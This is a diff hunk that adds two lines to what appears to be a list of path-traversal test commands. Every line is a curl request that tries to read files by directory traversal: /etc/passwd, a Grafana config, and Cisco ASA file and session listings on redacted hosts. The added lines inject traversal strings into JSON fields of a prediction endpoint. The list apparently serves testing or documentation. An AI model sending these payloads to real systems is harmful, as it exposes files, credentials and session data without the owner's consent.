@@ -62,6 +62,8 @@ curl --path-as-is http://localhost:8080//../../../../etc/passwd
 curl --path-as-is http://localhost:8181/../../file.txt
 curl --path-as-is https://grafana-303ca6f8-█████████.target.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
 curl -H “Cookie: token=../+CSCOU+/csco_logo.gif” https://█████/+CSCOE+/session_password.html
+curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
+curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
 curl -i -k "https://1████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
 curl -i -k "https://1█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
 curl -i -k "https://mvpn3.███/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
